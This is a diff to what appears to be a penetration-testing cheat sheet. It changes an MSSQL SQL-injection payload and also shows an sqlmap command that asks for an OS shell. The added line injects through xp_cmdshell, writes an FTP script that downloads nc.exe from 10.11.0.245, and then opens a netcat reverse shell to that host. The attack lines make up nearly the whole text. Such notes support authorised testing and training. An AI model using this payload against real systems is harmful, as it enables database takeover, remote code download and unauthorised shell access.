@@ -244,8 +244,8 @@ sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --thre
 ```
 
 ```bash
-# mssql cmdshell execution via SQL injection
-1000';+exec+master.dbo.xp_cmdshell+'ping+10.11.0.245';--
+# netcat reverse shell via mssql injection when xp_cmdshell is available
+1000';+exec+master.dbo.xp_cmdshell+'(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+>+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd';--
 ```
 
 ## Local Enumeration & Privilege Escalation
